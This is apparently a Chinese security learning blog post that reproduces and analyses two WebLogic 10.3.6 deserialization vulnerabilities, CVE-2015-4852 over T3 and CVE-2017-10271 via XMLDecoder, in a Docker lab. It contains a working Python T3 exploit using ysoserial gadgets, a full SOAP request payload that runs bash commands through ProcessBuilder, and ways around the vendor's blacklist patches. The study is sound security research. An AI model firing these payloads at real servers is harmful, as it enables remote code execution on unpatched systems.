# Weblogic学习(1)


&lt;!--more--&gt;

## 前言

最近在学 Java 相关框架的漏洞，先从 Weblogic 开始，先从最熟悉的反序列化开始，之后再学习其他利用，之后的文章都是 10.3.6.0 版本的 Weblogic ，环境搭建全用 T3 的就好了

## WebLogic T3 反序列化（CVE-2015-4852）

### 简介

WebLogic 是 Oracle 公司提供的一个**Java EE 应用服务器**，全名是 **Oracle WebLogic Server**，主要用于部署、运行 Java Web 应用（如 JSP、Servlet、EJB、Spring 等）。

相较于Tomcat，WebLogic更适合大型项目和开发环境

T3 协议其实是 Weblogic 内独有的一个协议，在 Weblogic 中对 RMI 传输就是使用的 T3 协议。在 RMI 传输当中，被传输的是一串序列化的数据，在这串数据被接收后，执行反序列化的操作。

在 T3 的这个协议里面包含请求包头和请求的主体这两部分内容。

### 环境搭建

用docker搭建，用qax的搭建脚本：https://github.com/QAX-A-Team/WeblogicEnvironment

先下个 jdk7u21，再来个其对于版本的 Weblogic 安装包，1036 的 generic 版本，然后把下好的 JDK 和 Weblogic 然后分别放在WeblogicEnvironment 的 jdks 和 weblogics 中

![image-20250424160954281](https://bu.dusays.com/2025/04/24/6809f1d14c589.png)

改下 Dockerfile

```dockerfile
# 基础镜像
FROM centos:centos7
# 参数
ARG JDK_PKG
ARG WEBLOGIC_JAR
# 解决libnsl包丢失的问题
# RUN yum -y install libnsl

# 创建用户
RUN groupadd -g 1000 oinstall &amp;&amp; useradd -u 1100 -g oinstall oracle
# 创建需要的文件夹和环境变量
RUN mkdir -p /install &amp;&amp; mkdir -p /scripts
ENV JDK_PKG=$JDK_PKG
ENV WEBLOGIC_JAR=$WEBLOGIC_JAR

# 复制脚本
COPY scripts/jdk_install.sh /scripts/jdk_install.sh 
COPY scripts/jdk_bin_install.sh /scripts/jdk_bin_install.sh 

COPY scripts/weblogic_install11g.sh /scripts/weblogic_install11g.sh
COPY scripts/weblogic_install12c.sh /scripts/weblogic_install12c.sh
COPY scripts/create_domain11g.sh /scripts/create_domain11g.sh
COPY scripts/create_domain12c.sh /scripts/create_domain12c.sh
COPY scripts/open_debug_mode.sh /scripts/open_debug_mode.sh
COPY jdks/$JDK_PKG .
COPY weblogics/$WEBLOGIC_JAR .

# 判断jdk是包（bin/tar.gz）weblogic包（11g/12c）载入对应脚本
RUN if [ $JDK_PKG == *.bin ] ; then echo ****载入JDK bin安装脚本**** &amp;&amp; cp /scripts/jdk_bin_install.sh /scripts/jdk_install.sh ; else echo ****载入JDK tar.gz安装脚本**** ; fi
RUN if [ $WEBLOGIC_JAR == *1036* ] ; then echo ****载入11g安装脚本**** &amp;&amp; cp /scripts/weblogic_install11g.sh /scripts/weblogic_install.sh &amp;&amp; cp /scripts/create_domain11g.sh /scripts/create_domain.sh ; else echo ****载入12c安装脚本**** &amp;&amp; cp /scripts/weblogic_install12c.sh /scripts/weblogic_install.sh &amp;&amp; cp /scripts/create_domain12c.sh /scripts/create_domain.sh  ; fi

# 脚本设置权限及运行
RUN chmod &#43;x /scripts/jdk_install.sh
RUN chmod &#43;x /scripts/weblogic_install.sh
RUN chmod &#43;x /scripts/create_domain.sh
RUN chmod &#43;x /scripts/open_debug_mode.sh
# 安装JDK
RUN /scripts/jdk_install.sh
# 安装weblogic
RUN /scripts/weblogic_install.sh
# 创建Weblogic Domain
RUN /scripts/create_domain.sh
# 打开Debug模式
RUN /scripts/open_debug_mode.sh
# 启动 Weblogic Server
# CMD [&#34;tail&#34;,&#34;-f&#34;,&#34;/dev/null&#34;]
CMD [&#34;/u01/app/oracle/Domains/ExampleSilentWTDomain/bin/startWebLogic.sh&#34;]
EXPOSE 7001
```

然后运行

```
docker build --build-arg JDK_PKG=jdk-7u21-linux-x64.tar.gz --build-arg WEBLOGIC_JAR=wls1036_generic.jar  -t weblogic1036jdk7u21 .

docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic1036jdk7u21 weblogic1036jdk7u21
```

如果说找不到 `weblogic_install.sh` ，那就把 `.gitignore` 文件最后的 `weblogics/` 去掉

如果遇到说内存不足，那就在配置文件 `docker.service` 的 `ExecStart` 配置后面加上 `--default-ulimit nofile=65536:65536`

然后访问 `http://192.168.2.128:7001/console/login/LoginForm.jsp` 即可

![image-20250424170146866](https://bu.dusays.com/2025/05/11/68204172a167d.png)

然后设置下远程调试，需要把一些weblogic的依赖Jar包给导出来才能进行远程调试

```
mkdir ./middleware
docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/modules ./middleware/
docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/wlserver ./middleware/
docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/coherence_3.7/lib ./middleware/
```

然后用 IDEA 打开 wlserver 文件夹，导入 coherence_3.7/lib 和 modules

![image-20250424172622511](https://bu.dusays.com/2025/05/11/6820417492726.png)

把 server/lib 也作为依赖进行导入

![image-20250424172744777](https://bu.dusays.com/2025/05/11/6820417457244.png)

然后添加远程 JVM 调试

![image-20250424173653693](https://bu.dusays.com/2025/05/11/68204172a6fe9.png)

### 漏洞复现

10.3.6 版本的 exp

```python
from os import popen
import struct # 负责大小端的转换
import subprocess
from sys import stdout
import socket
import re
import binascii

def generatePayload(gadget,cmd):
    YSO_PATH = r&#34;D:\14.Java\tools\windows_tools\windows_tools\ysoserial-all.jar&#34;
    popen = subprocess.Popen([&#39;java&#39;,&#39;-jar&#39;,YSO_PATH,gadget,cmd],stdout=subprocess.PIPE)
    return popen.stdout.read()

def T3Exploit(ip,port,payload):
    sock =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect((ip,port))
    handshake = &#34;t3 10.3.6\nAS:255\nHL:19\nMS:10000000\n\n&#34;
    sock.sendall(handshake.encode())
    data = sock.recv(1024)
    compile = re.compile(&#34;HELO:(.*).0.false&#34;)
    match = compile.findall(data.decode())
    if match:
        print(&#34;Weblogic: &#34;&#43;&#34;&#34;.join(match))
    else:
        print(&#34;Not Weblogic&#34;)
        #return
    header = binascii.a2b_hex(b&#34;00000000&#34;)
    t3header = binascii.a2b_hex(b&#34;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&#34;)
    desflag = binascii.a2b_hex(b&#34;fe010000&#34;)
    payload = header &#43; t3header  &#43;desflag&#43;  payload
    payload = struct.pack(&#34;&gt;I&#34;,len(payload)) &#43; payload[4:]
    sock.send(payload)

if __name__ == &#34;__main__&#34;:
    ip = &#34;192.168.2.128&#34;
    port = 7001
    gadget = &#34;CommonsCollections1&#34;
    cmd = &#34;touch /tmp/success_test&#34;
    payload = generatePayload(gadget,cmd)
    T3Exploit(ip,port,payload)
```

![image-20250424181926433](https://bu.dusays.com/2025/05/11/6820417258a82.png)

只试了下 cc 链，1、3、6、7都能打通

#### WebLogic请求分析

本地拿wireshark抓个回环包，借用下佬的图

![image-20250424182715727](https://bu.dusays.com/2025/05/11/682041729a61f.png)

第一部分是请求包头，第二部分是服务端的响应，第三部分是请求主体

可以看到服务端的响应，在得到了正确的请求头后，Weblogic会返回一个包含版本号的信息

在反序列化数据包中，`ac ed 00 05` 是反序列化标志，在 T3 协议中由于每个反序列化数据包前面都有 `fe 01 00 00` ，所以这里反序列化的标志就相当于是 `fe 01 00 00 ac ed 00 05`

![image-20250424182934350](https://bu.dusays.com/2025/05/11/682041756a6e1.png)

整个请求主体包含了6个部分的序列化数据，我们可以对其中任意一个部分进行攻击

![image-20250424183007025](https://bu.dusays.com/2025/05/11/68204172833a4.png)

### 漏洞分析

入口类是 `weblogic.rjvm.InboundMsgAbbrev` ，关注到其 `readObject` 方法

```java
    private Object readObject(MsgAbbrevInputStream var1) throws IOException, ClassNotFoundException {
        int var2 = var1.read();
        switch (var2) {
            case 0:
                return (new ServerChannelInputStream(var1)).readObject();
            case 1:
                return var1.readASCII();
            default:
                throw new StreamCorruptedException(&#34;Unknown typecode: &#39;&#34; &#43; var2 &#43; &#34;&#39;&#34;);
        }
    }
```

可以看到这里 var1 的 head 的值就是我们传入的序列化的数据

![image-20250424183934508](https://bu.dusays.com/2025/05/11/682041758b5bd.png)

然后进入 `ServerChannelInputStream` 构造函数

```java
        private ServerChannelInputStream(MsgAbbrevInputStream var1) throws IOException {
            super(var1);
            this.serverChannel = var1.getServerChannel();
        }
```

这里 var1 是个 MsgAbbrevInputStream 对象，这个类在 Weblogic 中实现的一个 Java 输入流类，用于接收消息并将其转换为 Java 对象， super 方法跟进去没啥东西，继续跟进 `getServerChannel`

```java
    public ServerChannel getServerChannel() {
        return this.connection.getChannel();
    }
```

`this.connection` 中存储了一些连接信息，包括IP，端口等，跟进 `getChannel` 方法

```java
        public final ServerChannel getChannel() {
            return MuxableSocketT3.this.getChannel();
        }
```

继续跟进，会调用到 `BaseAbstractMuxableSocket` 的 `getChannel` 方法

```java
    public final ServerChannel getChannel() {
        return this.channel;
    }
```

![image-20250424185722905](https://bu.dusays.com/2025/05/11/6820417280443.png)

处理完后回到 `InboundMsgAbbrev#readObject` 处，`ServerChannelInputStream` 继承了 `ObjectInputStream` 类，调用其 `readObject` 方法

![image-20250424221554617](https://bu.dusays.com/2025/05/11/682041729725e.png)

之后跟进后会调用到 `InboundMsgAbbrev#resolveClass` ，这其中的调用链

```
resolveClass:108, InboundMsgAbbrev$ServerChannelInputStream (weblogic.rjvm)
readNonProxyDesc:1610, ObjectInputStream (java.io)
readClassDesc:1515, ObjectInputStream (java.io)
readOrdinaryObject:1769, ObjectInputStream (java.io)
readObject0:1348, ObjectInputStream (java.io)
readObject:370, ObjectInputStream (java.io)
readObject:66, InboundMsgAbbrev (weblogic.rjvm)
```

这里的 var1 就是 `sun.reflect.annotation.AnnotationInvocationHandler` 类

![image-20250424222344429](https://bu.dusays.com/2025/05/11/68204175c1066.png)

再然后就会调用到 `AnnotationInvocationHandler#readObject` 了，之后就是 cc1 了

分析完调用流程后我们再回过头来看到poc

```
    header = binascii.a2b_hex(b&#34;00000000&#34;)
    t3header = binascii.a2b_hex(b&#34;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&#34;)
    desflag = binascii.a2b_hex(b&#34;fe010000&#34;)
    payload = header &#43; t3header  &#43;desflag&#43;  payload
    payload = struct.pack(&#34;&gt;I&#34;,len(payload)) &#43; payload[4:]
```

这里 header 表示数据包的长度，最开始只用于占位，可以看到最后生成 payload 时将其覆盖了，t3header 是 T3 协议的协议头，最后 desflag 就是反序列化标识，但在之前的分析中我们看到是8个字节，这里却只有4个字节，这是因为 yso 生成的 payload 会补全后四个字节

![image-20250424231103989](https://bu.dusays.com/2025/05/11/68204199d69b7.png)

### 漏洞修复

上面分析我们可以看出加载类其实是通过调用 `resolveClass()` 方法，再通过反射获取到任意类的，官方给出的修复就是在这个方法中加入黑名单

![image-20250425175438583](https://bu.dusays.com/2025/05/11/682041762e215.png)

因为这里是通过 T3 协议的请求来打，可以让 Web 代理的方式只能转发 HTTP 的请求，这样也能防住

### 小结

挺简单的，用 T3 协议时会反序列化请求主体中除一些固定数据（T3 协议自带的数据）外的数据，改这部分为恶意序列化数据就好了

后续就是加补丁，可以找黑名单外的类绕过，还能打 jrmp

### 参考

https://drun1baby.top/2022/11/28/CVE-2015-4852-WebLogic-T3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/#0x05-%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D

https://ilikeoyt.github.io/2024/02/26/Weblogic-T3%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96

https://xz.aliyun.com/news/9813



## WebLogic XMLDecoder反序列化（CVE-2017-10271）

### 前置学习

这里环境还是用的 jdk7u21 &#43; weblogic 10.3.6

#### XMLEncoder 和 XMLDecoder

XMLDecoder/XMLEncoder 是在JDK1.4版中添加的 XML 格式序列化持久性方案，使用 XMLEncoder 来生成表示  JavaBeans 组件(bean)的 XML 文档，用 XMLDecoder 读取使用 XMLEncoder 创建的 XML 文档获取  JavaBeans。

简单来说就是 Encoder 把 javabeans 变成 xml 格式，Decoder 把 xml 格式变成 Javabeans

##### demo

写个标准的 javabean 类方便后续 encoder 处理

```java
package org.example;

import java.io.Serializable;

public class person implements Serializable {
    private String name;
    private int age;
    //XMLEncoder要求类必须是标准的 JavaBean,必须有无参构造方法
    public person() {}
    public person(String name, int age) {
        this.name = name;
        this.age = age;
    }
    public String getName() {
        return name;
    }
    public void setName(String name) {
        this.name = name;
    }
    public int getAge() {
        return age;
    }
    public void setAge(int age) {
        this.age = age;
    }
}
```

###### Encoder

```java
package org.example;


import java.beans.XMLEncoder;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;

public class encoder {
    public static void main(String[] args) throws FileNotFoundException {
        person person1 = new person(&#34;6s6&#34;, 18);

        FileOutputStream fos = new FileOutputStream(&#34;encode.xml&#34;);
        XMLEncoder encoder = new XMLEncoder(fos);
        encoder.writeObject(person1);
        encoder.close();
    }
}
```

输出的encoder.xml为

```xml
&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
&lt;java version=&#34;1.7.0_21&#34; class=&#34;java.beans.XMLDecoder&#34;&gt;
 &lt;object class=&#34;org.example.person&#34;&gt;
  &lt;void property=&#34;age&#34;&gt;
   &lt;int&gt;18&lt;/int&gt;
  &lt;/void&gt;
  &lt;void property=&#34;name&#34;&gt;
   &lt;string&gt;6s6&lt;/string&gt;
  &lt;/void&gt;
 &lt;/object&gt;
&lt;/java&gt;
```

###### Decoder

```java
package org.example;

import java.beans.XMLDecoder;
import java.io.FileInputStream;
import java.io.FileNotFoundException;

public class decoder {
    public static void main(String[] args) throws FileNotFoundException {
        FileInputStream fis = new FileInputStream(&#34;D:\\14.Java\\java_test\\test\\encode.xml&#34;);
        XMLDecoder decoder = new XMLDecoder(fis);

        person decodedPerson = (person) decoder.readObject();
        System.out.println(&#34;Name: &#34; &#43; decodedPerson.getName());
        System.out.println(&#34;Age: &#34; &#43; decodedPerson.getAge());
    }
}
```

输出为

```
Name: 6s6
Age: 18
```

##### XML基础属性

###### string 标签

`hello,xml` 字符串的表示方式为 `&lt;string&gt;hello,xml&lt;/string&gt;`

###### object 标签

通过 `&lt;object&gt;` 标签表示对象， `class` 属性指定具体类(用于调用其内部方法)，`method` 属性指定具体方法名称（比如构造函数的的方法名为 `new` ）

###### void 标签

通过 `void` 标签表示函数调用、赋值等操作， `method` 属性指定具体的方法名称

###### array标签

通过 `array` 标签表示数组， `class` 属性指定具体类，内部 `void` 标签的 `index` 属性表示根据指定数组索引赋值

### 利用条件

使用 WLS-WebServices 组件

WebLogic 涉及版本

10.3.6.0

12.1.3.0.0

12.2.1.1.0

12.2.1.2.0

### 漏洞分析

#### 原理解析

上面看到了 Decoder 可以把 xml 解析成 Javabeans，而这里 WebLogic 的 WLS Security 组件对外提供得 WebService 服务，就是使用 XMLDecoder 来解析 XML 格式数据，其存在反序列化漏洞，从而导致 RCE，来看个demo

decode.java

```java
package org.example;

import java.beans.XMLDecoder;
import java.io.BufferedInputStream;
import java.io.FileInputStream;

public class decoder {
    public static void main(String[] args) throws Exception {
        FileInputStream file = new FileInputStream(&#34;D:\\14.Java\\java_test\\test\\poc.xml&#34;);
        XMLDecoder xmlDecoder = new XMLDecoder(new BufferedInputStream(file));
        Object result = xmlDecoder.readObject();
        xmlDecoder.close();
    }
}
```

poc.xml

```java
&lt;java version=&#34;1.4.0&#34; class=&#34;java.beans.XMLDecoder&#34;&gt;
    &lt;void class=&#34;java.lang.ProcessBuilder&#34;&gt;
        &lt;array class=&#34;java.lang.String&#34; length=&#34;1&#34;&gt;
            &lt;void index=&#34;0&#34;&gt;
                &lt;string&gt;Calc&lt;/string&gt;
            &lt;/void&gt;
        &lt;/array&gt;
        &lt;void method=&#34;start&#34;/&gt;&lt;/void&gt;
&lt;/java&gt;
```

解析这个xml，相当于用 `java.lang.ProcessBuilder` 来 rce，相当于执行以下代码

```
String[] cmd = new String[1];
cmd[0] = &#34;Calc&#34;;
new ProcessBuilder(cmd).start();
```

#### 漏洞复现

下面几个路由都能解析 xml

```
/wls-wsat/CoordinatorPortType
/wls-wsat/RegistrationPortTypeRPC
/wls-wsat/ParticipantPortType
/wls-wsat/RegistrationRequesterPortType
/wls-wsat/CoordinatorPortType11
/wls-wsat/RegistrationPortTypeRPC11
/wls-wsat/ParticipantPortType11
/wls-wsat/RegistrationRequesterPortType11
```

POST 请求包

```http
POST /wls-wsat/RegistrationRequesterPortType11 HTTP/1.1
Host: 192.168.2.128:7001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: text/html,application/xhtml&#43;xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: ADMINCONSOLESESSION=pG6NyP1TRTBQpCtbTcGdmT4FHw76PxC1nn6WrKbLVGhQ1LtxJLJv!441898134
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: text/xml
Content-Length: 680

&lt;soapenv:Envelope xmlns:soapenv=&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;&gt; &lt;soapenv:Header&gt;  
&lt;work:WorkContext xmlns:work=&#34;http://bea.com/2004/06/soap/workarea/&#34;&gt;  
&lt;java version=&#34;1.4.0&#34; class=&#34;java.beans.XMLDecoder&#34;&gt;  
&lt;void class=&#34;java.lang.ProcessBuilder&#34;&gt;  
&lt;array class=&#34;java.lang.String&#34; length=&#34;3&#34;&gt;  
&lt;void index=&#34;0&#34;&gt;  
&lt;string&gt;/bin/bash&lt;/string&gt;  
&lt;/void&gt;  
&lt;void index=&#34;1&#34;&gt;  
&lt;string&gt;-c&lt;/string&gt;  
&lt;/void&gt;  
&lt;void index=&#34;2&#34;&gt;  
&lt;string&gt;echo &#34;/wls-wsat/RegistrationRequesterPortType11&#34;&gt;&gt;/tmp/eeee&lt;/string&gt;  
&lt;/void&gt;  
&lt;/array&gt;  
&lt;void method=&#34;start&#34;/&gt;&lt;/void&gt;  
&lt;/java&gt;  
&lt;/work:WorkContext&gt;  
&lt;/soapenv:Header&gt;  
&lt;soapenv:Body/&gt;  
&lt;/soapenv:Envelope&gt;
```

根据要执行的命令调整 index 和对应的参数就好了

![image-20250428180342464](https://bu.dusays.com/2025/05/11/682041b472717.png)

稍微解释一下以上 poc ，xml 部分不多说，说下SOAP 请求结构

- Envelope：定义了 SOAP 消息的外层结构，使用的是标准的 SOAP Envelope 命名空间。
- Header：SOAP 消息中用来包含头部信息，这里特别使用了 `WorkContext`，这是 WebLogic Server 特有的机制，用于在 SOAP 请求中传递上下文或状态信息。

所以这个洞的本质其实是通过伪造的 SOAP 报文，把恶意的 XML 数据发送到服务器端，由服务器的 XMLDecoder 解析并实例化对象，从而触发任意代码执行

#### 代码分析

 `server/lib/wls-wsat.war/WEB-INF/web.xml` 中的接口都能对 SOAP 报文进行处理，也就是刚才那几个存在漏洞的路由接口

![image-20250428211934727](https://bu.dusays.com/2025/05/11/682041b4c3c95.png)

定位到 `weblogic.wsee.jaxws.workcontext.WorkContextServerTube` 的 `processRequest` 方法，这里对我们 POST 数据包中的 SOAP 数据进行了处理

这里可以看到 var1 就是我们传入的 xml 数据，var2 就是筛选出了XML 中 `&lt;soapenv:Header&gt;` 标签下的所有子元素

![image-20250428212336617](https://bu.dusays.com/2025/05/11/682041b4c381d.png)

然后把 var3 放进了 `readHeaderOld()` 方法进行处理

```java
    protected void readHeaderOld(Header var1) {
        try {
            XMLStreamReader var2 = var1.readHeader();
            var2.nextTag();
            var2.nextTag();
            XMLStreamReaderToXMLStreamWriter var3 = new XMLStreamReaderToXMLStreamWriter();
            ByteArrayOutputStream var4 = new ByteArrayOutputStream();
            XMLStreamWriter var5 = XMLStreamWriterFactory.create(var4);
            var3.bridge(var2, var5);
            var5.close();
            WorkContextXmlInputAdapter var6 = new WorkContextXmlInputAdapter(new ByteArrayInputStream(var4.toByteArray()));
            this.receive(var6);
        } catch (XMLStreamException var7) {
            throw new WebServiceException(var7);
        } catch (IOException var8) {
            throw new WebServiceException(var8);
        }
    }
```

先是创建了个用来读 xml 的 var2，然后创建了输入流和输出流，将 xml 数据写到 var4 中，最后就是 var6 的构造了，跟进 `WorkContextXmlInputAdapter`

```java
    public WorkContextXmlInputAdapter(InputStream var1) {
        this.xmlDecoder = new XMLDecoder(var1);
    }
```

new 了个 XMLDecoder，并将 var4 写进去了，然后跟进 `receive` 方法

```java
    protected void receive(WorkContextInput var1) throws IOException {
        WorkContextMapInterceptor var2 = WorkContextHelper.getWorkContextHelper().getInterceptor();
        var2.receiveRequest(var1);
    }
```

继续跟进 `receiveRequest` ，一直跟进就会来到 `weblogic.wsee.workarea.WorkContextXmlInputAdapter` 的 `readUTF` 方法

```java
    public String readUTF() throws IOException {
        return (String)this.xmlDecoder.readObject();
    }
```

最终调用到 `readObject` ，对xml进行反序列化

### 漏洞修复

#### CVE-2017-3506 补丁分析

在 `weblogic.wsee.workarea.WorkContextXmlInputAdapter` 中添加了 `validate` 验证，限制了 `object` 标签

```java
private void validate(InputStream is) {
      WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();
      try {
         SAXParser parser = factory.newSAXParser();
         parser.parse(is, new DefaultHandler() {
            public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
               if(qName.equalsIgnoreCase(&#34;object&#34;)) {
                  throw new IllegalStateException(&#34;Invalid context type: object&#34;);
               }
            }
         });
      } catch (ParserConfigurationException var5) {
         throw new IllegalStateException(&#34;Parser Exception&#34;, var5);
      } catch (SAXException var6) {
         throw new IllegalStateException(&#34;Parser Exception&#34;, var6);
      } catch (IOException var7) {
         throw new IllegalStateException(&#34;Parser Exception&#34;, var7);
      }
   }
```

将 `object` 修改成 `void` 即可绕过，比如像 payload 中用 `ProcessBuilder.start()` 这种没有返回值的方法来 rce时就能用 `void` 来绕过，用 `new` 也是可以的

```
&lt;java version=&#34;1.4.0&#34; class=&#34;java.beans.XMLDecoder&#34;&gt;
    &lt;new class=&#34;java.lang.ProcessBuilder&#34;&gt;    
        &lt;string&gt;calc&lt;/string&gt;
&lt;method name=&#34;start&#34; /&gt;
    &lt;/new&gt;
&lt;/java&gt;
```

#### CVE-2017-10271 补丁分析

```java
private void validate(InputStream is) {
   WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();
   try {
      SAXParser parser = factory.newSAXParser();
      parser.parse(is, new DefaultHandler() {
         private int overallarraylength = 0;
         public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
            if(qName.equalsIgnoreCase(&#34;object&#34;)) {
               throw new IllegalStateException(&#34;Invalid element qName:object&#34;);
            } else if(qName.equalsIgnoreCase(&#34;new&#34;)) {
               throw new IllegalStateException(&#34;Invalid element qName:new&#34;);
            } else if(qName.equalsIgnoreCase(&#34;method&#34;)) {
               throw new IllegalStateException(&#34;Invalid element qName:method&#34;);
            } else {
               if(qName.equalsIgnoreCase(&#34;void&#34;)) {
                  for(int attClass = 0; attClass &lt; attributes.getLength(); &#43;&#43;attClass) {
                     if(!&#34;index&#34;.equalsIgnoreCase(attributes.getQName(attClass))) {
                        throw new IllegalStateException(&#34;Invalid attribute for element void:&#34; &#43; attributes.getQName(attClass));
                     }
                  }
               }
               if(qName.equalsIgnoreCase(&#34;array&#34;)) {
                  String var9 = attributes.getValue(&#34;class&#34;);
                  if(var9 != null &amp;&amp; !var9.equalsIgnoreCase(&#34;byte&#34;)) {
                     throw new IllegalStateException(&#34;The value of class attribute is not valid for array element.&#34;);
                  }
```

还是黑名单，又加了几个标签，参看xmldecoder的官方文档很容易发现 class 标签可以动态加载任意类

![image-20250428223424983](https://bu.dusays.com/2025/05/11/682041b48d91c.png)

根据上面补丁的要求，我们知道所利用的类需要满足构造方法存在利用点，且其构造方法的参数类型恰好是字节数组或者是java中的基础数据类型，比如string，int这些，刚好 `oracle.toplink.internal.sessions.UnitOfWorkChangeSet` 就满足

![image-20250428223724642](https://bu.dusays.com/2025/05/11/682041b4850e4.png)

直接将传入的数据反序列化了，weblogic存在一个自带jre环境的版本，且自带的jdk版本为1.6&#43;，可以利用jdk7u21 gadget达到RCE，也可以打 cc，之前在 T3 的时候就知道能打部分 cc，而且weblogic还有 spring 的组件，可以利用FileSystemXmlApplicationContext和ClassPathXmlApplicationContext类加载spring的配置文件，打spring的依赖注入

后续的ban了class标签，还可以通过 `&lt;array method=&#34;forName&#34;&gt;` 来绕过，貌似只有 jdk1.6 能打，因为其XMLDecoder与高版本的不同

最后就索性也限制了array元素的长度

![image-20250428224444013](https://bu.dusays.com/2025/05/11/682041dce03f7.png)

据此，有佬给出了XMLDecoder官方文档的一句话

![image-20250428225431687](https://bu.dusays.com/2025/05/11/682041b47acad.png)

但貌似不行，如果超出了指定的 length ，应该还是会报错，暂时不深究了

### 小结

原理也说过，就是通过伪造的 SOAP 报文，把恶意的 XML 数据发送到服务器端，由服务器的 XMLDecoder 解析并实例化对象（反序列化），从而触发任意代码执行。用于处理 SOAP 报文的那几个路由都能打，后续绕过的话就是翻 XMLDecoder 官方文档找黑名单外的标签，比如过滤了 object ，就要 void 、new 来绕过，都禁用了，用 class 来动态加载类，最后还可以 `&lt;array method=&#34;forName&#34;&gt;` 来绕过 class，但所需的 jdk 版本太低了，感觉越到后面越没啥用

### 参考

https://drun1baby.top/2023/02/09/CVE-2017-10271-WebLogic-XMLDecoder/

https://xz.aliyun.com/news/4656

https://www.freebuf.com/vuls/206374.html

https://xz.aliyun.com/news/4656



## 总结

没什么好说的，感觉利用面比较窄，也没打过啥实战，也不清楚其实


---

> 作者: 6s6  
> URL: http://localhost:1313/posts/705d533/  

